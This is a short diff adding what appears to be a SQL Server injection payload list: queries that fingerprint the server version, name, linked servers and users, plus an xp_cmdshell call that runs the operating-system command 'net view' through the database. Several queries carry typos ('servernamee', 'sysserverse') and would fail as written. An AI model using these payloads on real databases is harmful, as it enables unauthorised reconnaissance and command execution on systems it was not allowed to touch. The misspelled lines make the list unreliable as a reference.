@@ -1,0 +1,6 @@
+select @@version
+select @@servernamee
+select @@microsoftversione
+select * from master..sysserverse
+select * from sysusers
+exec master..xp_cmdshell 'net+view'
